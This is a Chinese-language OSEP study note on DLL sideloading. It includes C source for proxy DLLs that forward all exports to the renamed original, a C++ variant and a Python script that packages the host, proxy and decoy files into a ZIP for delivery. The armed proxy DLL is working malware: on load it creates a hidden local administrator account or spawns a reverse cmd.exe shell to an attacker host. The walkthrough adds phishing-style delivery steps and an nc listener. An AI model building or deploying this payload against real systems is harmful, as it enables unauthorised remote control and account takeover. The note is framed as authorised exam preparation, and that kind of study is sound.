::: warning 仅限授权使用
本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
:::

# 04 · DLL 旁加载（DLL Sideloading）

> 归属模块：`M04` · 场景 11–12 · 依据：教材第 6 章（§6.1–6.2）
> 关联 cheat sheet 关键词：`New Admin with C` / `DLL` / `Shellcode Inject`
> 前置概念：Windows DLL 搜索顺序、PE 导入/导出表、调用约定。

## 0. 速览

| 文件 | 用途 |
|---|---|
| `m04-proxy-dll-sideload.c` | 纯转发 Proxy DLL（全导出转发 + 保持宿主正常），兼作场景 12 的“隔离对照版” |
| `m04-proxy-dll-newadmin.c` | 实弹版：加管理员 / 反连两种模式（编译期 `MODE` 宏切换），同样全导出转发 |
| `m04-proxy-dll-cpp.cpp` | C++ 版 + `.def` / 名字修饰 / 调用约定说明（含少量函数的手写转发示例） |
| `m04-build-sideload-package.py` | 把 宿主 + Proxy DLL + 改名原 DLL 打成 ZIP，校验 PE 架构与文件完整性 |

一句话模型：**宿主程序用“裸文件名”加载同目录 DLL 时，Windows 先搜“宿主 EXE 所在目录”**。我们把同名 DLL 换成自己的 Proxy，Proxy 再把原 DLL 的全部导出“转发”给改名后的原文件（`original.dll`），宿主功能不坏，我们自己的代码照跑。

#### `m04-proxy-dll-sideload.c` {#m04-proxy-dll-sideload-c}

````c
/*
 * m04-proxy-dll-sideload.c
 *
 * 用途：DLL 旁加载的"纯转发 / 无载荷对照"Proxy。编译出的 DLL 与宿主原
 *       DLL 同名（如 legit.dll），把原 DLL 全部导出通过 forward.def 转发
 *       给同目录改名后的原文件（original.dll），宿主功能完全不受影响。
 *       本文件不携带任何载荷——用于场景 12 的变量隔离：先证明"转发正确、
 *       宿主不崩"，再换成实弹版 m04-proxy-dll-newadmin.c。
 * 场景：M04 · 场景 11（兼容性验证）/ 场景 12（闪退排查第一步）
 * 依赖：MinGW-w64 或 MSVC；原 DLL 的导出清单（objdump -p / dumpbin /exports）
 * 使用：
 *   # 先按导出清单生成 forward.def（内容形如 "Foo = original.Foo"，见文档 §2）
 *   x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-sideload.c forward.def
 *   strip legit.dll
 *   # MSVC：cl /LD m04-proxy-dll-sideload.c /Fe:legit.dll /link /DEF:forward.def
 * 占位符：无（纯转发，无网络/账号动作）；文件内仅供调试的宏均默认关闭。
 * 测试状态：未实测（无靶机）；语法与链接方式按 MinGW 常规用法编写，首次使用
 *   请在复刻 VM 用 "宿主 + original.dll 改名同目录" 验证宿主正常启动。
 */

#include <windows.h>

/*
 * DLL_PROCESS_ATTACH 里只做最小动作并返回 TRUE。
 * 规则：DllMain 运行在加载器锁内——不 LoadLibrary、不等待、不做网络 I/O。
 * 若需要确认"我们的 DLL 确实被加载"（仅本地排障，靶机上会留痕迹）：
 *   定义宏 DEBUG_LOADED 会在 %TEMP%\m04-sideload-loaded.txt 写一行时间戳。
 */
#ifdef DEBUG_LOADED
#include <stdio.h>
static void NoteLoaded(void)
{
    char path[MAX_PATH];
    FILE *f;
    if (!GetTempPathA(MAX_PATH, path))
        return;
    lstrcatA(path, "m04-sideload-loaded.txt");
    f = fopen(path, "a");
    if (f) {
        fprintf(f, "proxy loaded into pid %lu\n", GetCurrentProcessId());
        fclose(f);
    }
}
#endif

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    (void)hModule;
    (void)lpReserved;
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
#ifdef DEBUG_LOADED
        NoteLoaded();
#endif
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

/*
 * 可选的 rundll32 测试入口：rundll32 legit.dll,Run 可脱离宿主单独验证本 DLL
 * 能被加载并调用（用于场景 12 判断"是宿主环境问题还是 DLL 问题"）。
 * 注意：真实投递包里的 DLL 文件名必须是宿主加载的名字，不要依赖此入口。
 */
__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
                                        LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    /* 空实现：仅证明加载/调用链可用 */
}

/*
 * 说明：所有转发导出由 forward.def 提供，不在 C 源码里声明——
 * 避免手写每个函数的签名（签名错 = 调用约定错 = 场景 12 闪退）。
 * 若 .def 转发在你的工具链上不被支持（个别旧版 binutils），回退方案：
 *   1) 用 MSVC link.exe /DEF:forward.def 编译；
 *   2) 或改用 m04-proxy-dll-cpp.cpp 里的"手写少量转发"模式（函数少时）。
 */
````

#### `m04-proxy-dll-newadmin.c` {#m04-proxy-dll-newadmin-c}

````c
/*
 * m04-proxy-dll-newadmin.c
 *
 * 用途：DLL 旁加载的"实弹"Proxy —— 转发保持宿主正常的同时执行载荷，
 *       支持两种编译期模式：
 *         MODE_NETUSER（默认）：创建本地管理员账号（cheat sheet "New Admin
 *                   with C" 路线），适合宿主以提升权限运行时；
 *         MODE_REVERSE：反连 TCP shell，适合普通用户权限拿到交互式会话。
 *       所有转发导出仍由 forward.def 提供（与 m04-proxy-dll-sideload.c 相同）。
 * 场景：M04 · 场景 11（主投递载荷）；场景 12（确认转发无误后接上载荷）
 * 依赖：MinGW-w64 / MSVC；ws2_32、netapi32；
 *       forward.def（由原 DLL 导出清单生成，见 docs/04-dll-sideloading.md）
 * 使用：
 *   反连模式（Kali 交叉编译）：
 *     x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
 *       -lws2_32 -lnetapi32 -DMODE_REVERSE \
 *       -DLHOST=L\"10.0.0.5\" -DLPORT=L\"4444\"
 *   加管理员模式：
 *     x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
 *       -lnetapi32 -DMODE_NETUSER \
 *       -DADMIN_USER=L\"ExamUser\" -DADMIN_PASS=L\"ExamPass!23\"
 *   编译出的 DLL 改名为宿主加载的名字（如 legit.dll）放进宿主目录。
 * 占位符：LHOST / LPORT（反连目标）、USER / PASS（新账号，默认值仅占位，
 *       编译前必须 -D 覆盖）。 目标机器上若不加 -D 覆盖会创建字面量
 *       "USER"/"PASS" 账号 —— 考试时务必替换。
 * 测试状态：未实测。语法按 MinGW-w64 常规编写，未在靶机验证；首次使用先在本
 *   机 VM 用无载荷版 m04-proxy-dll-sideload.c 跑通转发，再编译本文件只验载荷。
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <stdlib.h>

/* MSVC 用的自动链接；MinGW 需在命令行 -lws2_32 -lnetapi32 */
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "netapi32.lib")

#ifndef MODE_NETUSER
#ifndef MODE_REVERSE
#define MODE_NETUSER          /* 默认：加管理员 */
#endif
#endif

#ifndef LHOST
#define LHOST L"127.0.0.1"    /* 占位符，编译时必须覆盖 */
#endif
#ifndef LPORT
#define LPORT L"4444"
#endif
#ifndef ADMIN_USER
#define ADMIN_USER L"USER"    /* 占位符，编译时必须覆盖 */
#endif
#ifndef ADMIN_PASS
#define ADMIN_PASS L"PASS"
#endif

/* ---------- 模式一：创建本地管理员（cheat sheet: New Admin with C） ---------- */

static DWORD AddAdminUser(void)
{
    NET_API_STATUS rc;
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_0 gm;
    SID_NAME_USE snu;
    BYTE sid[256];
    DWORD cbSid = sizeof(sid);
    DWORD cbDomain = sizeof(sid) / sizeof(WCHAR);
    WCHAR domain[256];

    ZeroMemory(&ui, sizeof(ui));
    ui.usri1_name        = (LPWSTR)ADMIN_USER;
    ui.usri1_password    = (LPWSTR)ADMIN_PASS;
    ui.usri1_priv        = USER_PRIV_USER;               /* 创建时不能直接给管理员 */
    ui.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;
    ui.usri1_script_path = NULL;

    rc = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);         /* 本地服务器 */
    if (rc != NERR_Success)
        return rc;

    if (!LookupAccountNameW(NULL, (LPWSTR)ADMIN_USER, sid, &cbSid,
                            domain, &cbDomain, &snu))
        return (DWORD)GetLastError();

    gm.lgrmi0_sid = (PSID)sid;
    rc = NetLocalGroupAddMembers(NULL, L"Administrators", 0, (LPBYTE)&gm, 1);
    return rc;
}

static DWORD WINAPI NetUserThread(LPVOID ctx)
{
    (void)ctx;
    AddAdminUser();
    return 0;
}

/* ---------- 模式二：反连 TCP shell ---------- */

static DWORD WINAPI ReverseThread(LPVOID ctx)
{
    WSADATA wsa;
    SOCKET s = INVALID_SOCKET;
    struct sockaddr_in sa;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    WCHAR cmdline[] = L"cmd.exe";

    (void)ctx;
    Sleep(2000);                                   /* 等宿主 UI 先出现 */
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET)
        goto fail;

    sa.sin_family = AF_INET;
    sa.sin_port = htons((u_short)_wtoi(LPORT));
    if (InetPtonW(AF_INET, LHOST, &sa.sin_addr) != 1)
        goto fail;

    if (WSAConnect(s, (const struct sockaddr *)&sa, sizeof(sa),
                   NULL, NULL, NULL, NULL) != 0)
        goto fail;

    /* 让 socket 句柄可被子进程继承，作为 cmd 的标准句柄 */
    SetHandleInformation((HANDLE)s, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessW(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        goto fail;

    WaitForSingleObject(pi.hProcess, INFINITE);    /* cmd 退出前保持 socket */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);
    WSACleanup();
    return 0;

fail:
    if (s != INVALID_SOCKET)
        closesocket(s);
    WSACleanup();
    return 1;
}

/* ---------- 入口 ---------- */

static void LaunchPayload(void)
{
    HANDLE h;
#ifdef MODE_REVERSE
    h = CreateThread(NULL, 0, ReverseThread, NULL, 0, NULL);
#else
    h = CreateThread(NULL, 0, NetUserThread, NULL, 0, NULL);
#endif
    if (h != NULL)
        CloseHandle(h);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    (void)hModule;
    (void)lpReserved;
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        /* 加载器锁内禁止重活/等待：只开线程，动作全部放线程里 */
        LaunchPayload();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

/*
 * rundll32 独立测试入口：rundll32 legit.dll,Run
 * 可在不带宿主的情况下验证载荷；真实旁加载时 DllMain 已触发，此入口仅排障用。
 */
__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
                                        LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    LaunchPayload();
}
````

#### `m04-proxy-dll-cpp.cpp` {#m04-proxy-dll-cpp-cpp}

````cpp
// m04-proxy-dll-cpp.cpp
//
// 用途：DLL 旁加载 Proxy 的 C++ 写法示例。重点说明三件事：
//   1) C++ 导出必须用 extern "C"（否则函数名被名字修饰，宿主按原名字解析不到）；
//   2) 调用约定：__stdcall vs __cdecl，装饰名（@N / 前导下划线）不同；
//   3) .def 文件的作用与静态转发 vs 手写转发（运行时 GetProcAddress）的取舍。
//      静态转发（.def: Foo = original.Foo）自动保持原名与约定，是首选；
//      本文件的 Forwarded 包装只用于"宿主只调少数几个函数、不想做全量 .def"
//      的场合，作为对照写法保留。
// 场景：M04 · 场景 11/12（C++ 代码库团队时的同构版本；.def/约定排障参考）
// 依赖：MinGW-w64 g++ 或 MSVC；原 DLL（改名 original.dll 放同目录）
// 使用：
//   x86_64-w64-mingw32-g++ -shared -O2 -std=c++17 -o legit.dll \
//       m04-proxy-dll-cpp.cpp forward.def -lws2_32 -lnetapi32
//   MSVC：cl /LD m04-proxy-dll-cpp.cpp /Fe:legit.dll /link /DEF:forward.def
// 占位符：无默认载荷；LHOST/LPORT 注释给出，需要时照抄 m04-proxy-dll-newadmin.c。
// 测试状态：未实测（无靶机）；仅做语法与链接形态示例，使用前在复刻 VM 验证。

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>

#pragma comment(lib, "kernel32.lib")

// ---------------------------------------------------------------------------
// 名字修饰说明（x86 32 位时最明显；x64 无 cdecl/stdcall 之分但仍有 C++ 修饰）：
//   C++ 成员/自由函数默认导出名带修饰（?Foo@@YAHH@Z）。
//   避免办法：整段 extern "C"；或全部走 .def（.def 里的名字原样作为导出名）。
//   手写转发版里，函数必须与宿主导入的名字/约定完全一致，例如 32 位下：
//     __cdecl  int Foo(int)        -> _Foo
//     __stdcall int Foo(int)       -> _Foo@4
//   宿主按哪个名字导入，就按哪个写。优先 .def 静态转发可完全绕开该问题。
// ---------------------------------------------------------------------------

extern "C" {

// .def 静态转发模式：本文件只需提供 DllMain，全部导出由 forward.def 给出：
//   EXPORTS
//     Foo = original.Foo
//     Bar = original.Bar @7        ; 仅按序号导出的要保留 @N
// 上面的转发会让 loader 在同目录加载 original.dll 并继续转发，宿主功能不变。

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    (void)hModule; (void)lpReserved;
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // 载荷触发点：只 CreateThread，不在此处做重活（加载器锁限制同 .c 版）。
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// ---------------------------------------------------------------------------
// 对照写法：手写转发（运行时转发）。仅当原 DLL 导出很少、且你能拿到每个
// 函数的原型时才用。首次调用时从同目录 original.dll 取函数指针并缓存。
// 若原 DLL 导出几十个函数，别手写——用 .def 全量转发。
// ---------------------------------------------------------------------------

namespace {

HMODULE g_original = nullptr;      // 缓存 original.dll 句柄（首次调用懒加载）

HMODULE LoadOriginal()
{
    if (g_original == nullptr)
        g_original = LoadLibraryW(L"original.dll");
    return g_original;
}

} // namespace

// 示例：宿主导入 original.dll 的 __cdecl int Foo(int)。
// 导出名由 .def 控制（推荐：Foo = original.Foo），若不用 .def 想用
// __declspec(dllexport)，必须保证下面签名的导出名与宿主导入名一致。
__declspec(dllexport) int __cdecl Foo(int a)
{
    HMODULE h = LoadOriginal();
    if (h == nullptr)
        return -1;                 // original.dll 缺失时优雅失败，避免宿主崩
    typedef int(__cdecl *FooFn)(int);
    FooFn fn = reinterpret_cast<FooFn>(GetProcAddress(h, "Foo"));
    return fn ? fn(a) : -1;
}

// 示例：__stdcall 且有 2 个参数 → 32 位下导出名 _Bar@8。
__declspec(dllexport) int __stdcall Bar(int a, int b)
{
    HMODULE h = LoadOriginal();
    if (h == nullptr)
        return -1;
    typedef int(__stdcall *BarFn)(int, int);
    BarFn fn = reinterpret_cast<BarFn>(GetProcAddress(h, "Bar"));
    return fn ? fn(a, b) : -1;
}

} // extern "C"

// ---------------------------------------------------------------------------
// 工程建议：
//   * 有 .def 时优先 .def（原名/原约定/原序号自动保留，也不用管 extern "C"）；
//   * .def 里一行一个函数；用 objdump -p / dumpbin /exports 从原 DLL 直接生成；
//   * 载荷代码（反连/加管理员）与 .c 版通用，需要时从
//     m04-proxy-dll-newadmin.c 移植到 DllMain 或独立线程函数。
// ---------------------------------------------------------------------------
````

#### `m04-build-sideload-package.py` {#m04-build-sideload-package-py}

````python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# m04-build-sideload-package.py
#
# 用途：把 DLL 旁加载目录包打成 ZIP 交付件，并在打包前做一致性校验：
#       - 目录里所有 PE 文件架构一致（x86/x64，混装必闪退 = 场景 12）；
#       - "宿主加载名 DLL"（proxy）与 "改名原 DLL" 都必须在场；
#       - proxy 的导出函数数量与原 DLL 对齐（全量转发才保证宿主不崩；
#         数量对不上说明 forward.def 漏了导出，是闪退主因）。
#       输出 ZIP + SHA256，便于投递后核验文件未被篡改。
# 场景：M04 · 场景 11 投递前准备 / 场景 12 导出转发自查
# 依赖：Python 3 标准库（无需 pefile）；目录内是编译好的宿主与 DLL
# 使用：
#   python3 m04-build-sideload-package.py \
#       --input-dir ./sideload --dll-name legit.dll --original-name original.dll \
#       --out sideload-pkg.zip
#   目录期望布局（原样打进 ZIP，外层套一个 <top-dir> 文件夹）：
#     sideload/
#       RunHost.exe     宿主（原版不动）
#       legit.dll       proxy（已编好并改成宿主加载的名字，由 --dll-name 指定）
#       original.dll    原版 legit.dll 改名后的转发目标
#       其它文件/子目录  诱饵，保持业务外观
# 占位符：无（文件名由参数传入）
# 测试状态：未实测；PE 解析按标准结构编写（MZ->PE->可选头->导出目录），
#   建议先在复刻 VM 上用真实宿主/原 DLL 跑一遍 --dry-run 校验输出再投递。

import argparse
import hashlib
import os
import struct
import sys
import zipfile

MACHINE = {0x14C: "x86 (PE32)", 0x8664: "x64 (PE32+)", 0x1C0: "ARM", 0xAA64: "ARM64"}
EXP_DIR_IDX = 0  # IMAGE_DIRECTORY_ENTRY_EXPORT

class PeInfo(object):
    def __init__(self, path, arch, n_exports):
        self.path = path
        self.arch = arch            # 0x14C / 0x8664 / None
        self.n_exports = n_exports  # 名字导出数（转发/原 DLL 都应有值）

    def __repr__(self):
        return "%s arch=%s exports=%d" % (
            os.path.basename(self.path),
            MACHINE.get(self.arch, "unknown(0x%X)" % self.arch) if self.arch else "not-PE",
            self.n_exports)

def _u16(buf, off):
    return struct.unpack_from("<H", buf, off)[0]

def _u32(buf, off):
    return struct.unpack_from("<I", buf, off)[0]

def _read_cstr(buf, off):
    end = buf.find(b"\x00", off)
    return buf[off:end].decode("latin-1", "replace") if end != -1 else ""

def parse_pe(path):
    """返回 (arch_machine, n_export_names)；非 PE/解析失败抛 ValueError。"""
    with open(path, "rb") as f:
        buf = f.read()
    if buf[:2] != b"MZ":
        raise ValueError("no MZ header")
    pe = _u32(buf, 0x3C)
    if pe + 6 > len(buf) or buf[pe:pe + 4] != b"PE\x00\x00":
        raise ValueError("no PE signature")
    arch = _u16(buf, pe + 4)
    n_sec = _u16(buf, pe + 6)
    opt_size = _u16(buf, pe + 20)
    opt = pe + 24
    magic = _u16(buf, opt)
    if magic == 0x10B:
        dd_base = opt + 96           # PE32 数据目录偏移
    elif magic == 0x20B:
        dd_base = opt + 112          # PE32+ 数据目录偏移
    else:
        raise ValueError("unknown optional header magic 0x%X" % magic)

    sections = []
    sec = opt + opt_size
    for i in range(n_sec):
        s = sec + i * 40
        sections.append((_u32(buf, s + 12),     # VirtualAddress
                         _u32(buf, s + 8),      # VirtualSize
                         _u32(buf, s + 20),     # PointerToRawData
                         _u32(buf, s + 16)))    # SizeOfRawData

    def rva2off(rva):
        for va, vs, raw, size in sections:
            if va <= rva < va + max(vs, size):
                off = raw + (rva - va)
                if 0 <= off < len(buf):
                    return off
        return None

    n_names = 0
    exp_rva = _u32(buf, dd_base + 8 * EXP_DIR_IDX)
    exp_off = rva2off(exp_rva) if exp_rva else None
    if exp_off is not None:
        n_names = _u32(buf, exp_off + 24)          # NumberOfNames
        names_rva = _u32(buf, exp_off + 32)        # AddressOfNames (RVA 表)
        base = rva2off(names_rva)
        if base is not None:
            for i in range(min(n_names, 64)):      # 只抽查前 64 个名字可读
                no = rva2off(_u32(buf, base + i * 4))
                if no is None or not _read_cstr(buf, no):
                    raise ValueError("export name table corrupt")
    return arch, n_names

def main(argv):
    ap = argparse.ArgumentParser(description="Build & validate a DLL sideload ZIP package")
    ap.add_argument("--input-dir", required=True, help="目录：宿主 + proxy DLL + 改名原 DLL + 诱饵")
    ap.add_argument("--dll-name", required=True, help="宿主实际加载的 DLL 文件名（= proxy 的名字）")
    ap.add_argument("--original-name", default="original.dll", help="原 DLL 改名后的文件")
    ap.add_argument("--out", default="sideload-pkg.zip", help="输出 ZIP")
    ap.add_argument("--top-dir", default="", help="ZIP 内顶层文件夹名（默认 <input 目录名>-pkg）")
    args = ap.parse_args(argv)

    indir = args.input_dir
    if not os.path.isdir(indir):
        print("[-] input dir not found: %s" % indir)
        return 1
    top = args.top_dir or (os.path.basename(os.path.abspath(indir)) + "-pkg")

    ppe = os.path.join(indir, args.dll_name)
    porig = os.path.join(indir, args.original_name)
    if not os.path.isfile(ppe):
        print("[-] proxy DLL missing (host-loaded name): %s" % ppe)
        return 1
    if not os.path.isfile(porig):
        print("[-] renamed original DLL missing: %s" % porig)
        return 1

    # 1) 目录内所有 PE 架构必须一致
    arch0 = None
    for name in sorted(os.listdir(indir)):
        p = os.path.join(indir, name)
        if os.path.isdir(p):
            continue
        try:
            arch, _ = parse_pe(p)
        except ValueError:
            print("[!] skip non-PE file: %s" % name)
            continue
        if arch not in MACHINE:
            print("[!] skip unknown-arch PE: %s" % name)
            continue
        if arch0 is None:
            arch0 = arch
            print("[*] PE arch baseline: %s" % MACHINE[arch])
        elif arch != arch0:
            print("[-] arch mismatch: %s is %s, baseline is %s" % (
                name, MACHINE.get(arch, hex(arch)), MACHINE[arch0]))
            return 1

    # 2) proxy 与原 DLL 导出函数数量对齐（全量转发检查）
    _, n_proxy = parse_pe(ppe)
    _, n_orig = parse_pe(porig)
    print("[*] %s exports=%d | %s exports=%d" % (
        args.dll_name, n_proxy, args.original_name, n_orig))
    if n_proxy == 0:
        print("[-] proxy exports 0 names: forward.def 没生效或 .def 为空，宿主将因缺导入闪退")
        return 1
    if n_proxy != n_orig:
        print("[!] export count mismatch (%d != %d): forward.def 漏导出或含多余导出，"
              "宿主可能闪退；请用 dumpbin/objdump 对比导出表" % (n_proxy, n_orig))

    # 3) 打包：顶层套 top 文件夹，保留相对结构
    with zipfile.ZipFile(args.out, "w", zipfile.ZIP_DEFLATED) as z:
        for root, dirs, files in os.walk(indir):
            dirs.sort()
            for name in sorted(files):
                full = os.path.join(root, name)
                rel = os.path.relpath(full, indir)
                z.write(full, os.path.join(top, rel))
    sha = hashlib.sha256(open(args.out, "rb").read()).hexdigest()
    print("[+] wrote %s (%d bytes) sha256=%s" % (args.out, os.path.getsize(args.out), sha))
    print("[*] manual checks before delivery: 1) 复刻 VM 上解压双击宿主应正常启动"
          "且载荷生效; 2) ProcMon 确认 Load Image 命中 top/%s; 3) 版本与目标一致"
          % args.dll_name)
    return 0

if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
````

## 1. 核心概念（先背这四条）

1. **搜索顺序（SafeDllSearchMode 默认开）**：宿主 EXE 目录 → System32 → System16 → Windows → 当前目录 → PATH。旁加载能成立的前提是：宿主用**裸名或相对路径**加载该 DLL（例如 `LoadLibrary("updater.dll")`）；若宿主用**绝对路径**指向 System32、或目标在 KnownDLLs / 有 `SetDllDirectory` 限制，则这条路不通（→ 失败分支 2）。
2. **Sideload ≠ Hijack**：旁加载目标 DLL 本来**就该**从宿主目录加载（通常是无害的私有 DLL），我们只是提前放进同名文件；劫持（hijack）是替换本应从 System32 加载的系统 DLL。OSEP 场景 11 属于前者：文件要放在宿主目录，宿主必须能正常启动。
3. **宿主导入在加载期解析**：`host.exe` 的导入表里如果有 `legit.dll:Foo`，加载器必须在我们 DLL 的导出表里找到 `Foo`，**找不到进程直接起不来（典型的“闪退”）**。所以 Proxy 要么转发全部导出，要么把宿主实际调用的每个函数都实现。
4. **架构与位数必须匹配**：x86 宿主只能加载 x86 Proxy（加载失败即闪退）；调用约定不匹配（stdcall/cdecl）会在**第一次调用**时崩溃。`.def` 静态转发**天然保持原函数名与约定**，因此优先于手写实现。

转发机制：链接期用 `.def` 文件把每个导出写成 `Foo = original.Foo`，loader 在解析该导出时**自动加载同目录 `original.dll`** 并继续转发。Proxy 自己只保留 `DllMain`（+ 载荷线程），不需要知道每个函数的签名。

## 2. 场景 11：用户会打开 ZIP 中的程序，但宏和脚本入口不可用

### 场景回顾
投递 ZIP，用户解压并运行里面的（签名）程序；该程序会加载同目录下一个 DLL。宏、脚本、HTML 等入口全部不可用，唯一执行面就是这个 DLL 旁加载。我们要交一个“能跑、宿主不崩、带载荷”的目录包。

### 前提与假设
- 已知宿主程序名与**确切版本**（导出表随版本变化，版本错=闪退）。
- 宿主确实用裸名/相对路径加载同目录 DLL（可在本地 VM 用 ProcMon 先验证一次）。
- 目标机器允许运行该程序（它是“允许启动”的白名单程序，AppLocker/杀软不拦宿主；但**我们的未签名 DLL** 可能被查 → OPSEC 节）。
- 用户以普通用户运行：载荷默认拿到用户权限；若宿主带 `requireAdministrator` manifest 或由计划任务以 SYSTEM 拉起，载荷自动提升（分情况见验证节）。

### 准备（攻击机侧）
1. **锁定宿主与版本、架构**（在靶机/复刻 VM 上做一次）：
   - 架构：`file RunHost.exe`（PE32=x86 / PE32+=x64），Windows 下 `dumpbin /headers RunHost.exe | findstr machine`。
   - 版本：文件属性→详细信息，或 `dumpbin /headers` 里的版本资源。**记录版本号**，包内只放这个版本。
   - 确认旁加载点：ProcMon 过滤器 `Process Name = RunHost.exe` + `Operation = Load Image`，找 `Path` 以 `.dll` 结尾且位于 `RunHost.exe` 同目录的项——这就是候选。若目标 DLL 实际从 System32 加载（Result 显示路径在 `C:\Windows\System32`），说明宿主给的是绝对路径，换候选。
2. **导出原 DLL 的完整清单**（决定 `.def` 内容）：
   - Kali：`x86_64-w64-mingw32-objdump -p original.dll | sed -n '/Export Name Pointer Table/,/Ordinal Hint Table/p'` 看函数名；`file original.dll` 看架构。
   - Windows：`dumpbin /exports original.dll`（含序号与 RVA；留意是否**仅按序号导出**、是否导出了变量）。
3. **生成转发 `.def`**（放在与源码同目录，名字随意，如 `forward.def`）：
   ```
   EXPORTS
     Foo = original.Foo
     Bar = original.Bar
     ; 仅按序号导出时保留序号：
     Baz = original.Baz @12
   ```
   批量生成（Linux，把 `original.dll` 换成实际改名后的文件名）：
   ```bash
   printf 'EXPORTS\n' > forward.def
   x86_64-w64-mingw32-objdump -p original.dll \
     | sed -n '/Export Name Pointer Table/,/Ordinal Hint Table/p' \
     | grep -o '"[^"]*"' | tr -d '"' \
     | sed 's/.*/& = original.&/' >> forward.def
   ```
4. **编译 Proxy**（两个工具链任选其一；`.def` 提供全部导出，源码只给 `DllMain`/载荷）：
   - MinGW（Kali/攻击机直接编）：
     ```bash
     # x64
     x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
       -lws2_32 -lnetapi32 -DUNICODE -D_UNICODE -DMODE_REVERSE
     # x86（宿主是 32 位时）
     i686-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
       -lws2_32 -lnetapi32 -DUNICODE -D_UNICODE -DMODE_REVERSE
     strip legit.dll
     ```
   - MSVC（复刻 VM 上编）：`cl /LD m04-proxy-dll-newadmin.c /Fe:legit.dll /link /DEF:forward.def ws2_32.lib netapi32.lib`
5. **目录包结构**（解压后用户直接双击宿主即触发）：
   ```
   sideload/
   ├─ RunHost.exe      ← 原版宿主，不动
   ├─ legit.dll        ← 我们的 Proxy（文件名 = 宿主加载的名字）
   ├─ original.dll     ← 原版 legit.dll 改名（转发目标）
   └─ readme.txt / 数据文件  ← 诱饵，让目录像正常安装
   ```
6. **打包与校验**（自动做架构一致性检查）：`m04-build-sideload-package.py`（见下）。把 ZIP 放到攻击机 HTTP 服务，开好监听：
   - 反连模式：`nc -lvnp LPORT`
   - 加管理员模式：不需要监听，事后 `net localgroup administrators` 验证。

### 执行步骤
1. 投递 ZIP（邮件/网站下载），话术引导用户“解压并运行 `RunHost.exe`”。
2. 用户双击 → 宿主正常启动（窗口出现=Proxy 转发成功的第一步）→ 载荷线程触发。
   - 反连模式：载荷在 `DllMain` 里 `CreateThread` 起反连线程（**不在 DllMain 里阻塞**，见场景 12），数秒内攻击机收到 shell。
   - 加管理员模式：`DllMain` 里直接 `NetUserAdd` + `NetLocalGroupAddMembers`。
3. 维持宿主存活：载荷是后台线程，宿主继续跑（必要时先让载荷 `Sleep(3000)` 再连，等宿主 UI 出来，更像正常程序）。
4. 收到 shell 后按流程枚举/提权（默认用户权限时），注意 `whoami` 先确认上下文。

### 用到的脚本
- `m04-proxy-dll-newadmin.c`（实弹；编译命令见上）
- `m04-build-sideload-package.py`（打包 + 架构校验）
- `m04-proxy-dll-sideload.c`（排障时做“无载荷对照”，见场景 12）

### 验证
- 反连：监听端收到连接，`whoami` 可执行；宿主窗口仍在（`tasklist | findstr RunHost`）。
- 加管理员：`net localgroup administrators` 出现新用户；宿主进程存活。
- 无载荷对照（`m04-proxy-dll-sideload.c`）在**复刻 VM**上能跑通 = Proxy 转发正确，后面换实弹版只排查载荷本身。
- 权限断言：开管理员命令行执行同一程序对比 `whoami` 完整性级别；宿主若带 manifest 提升，载荷会是 High Integrity（→ 直接可做管理员操作）。

### 失败分支与备选
1. **宿主版本对不上 / 导出清单不全** → 宿主缺导入即闪退。处理：拿到目标上**同版本**原 DLL 重新 `objdump -p` 生成 `.def`；在复刻 VM 用同版本验证后再投。
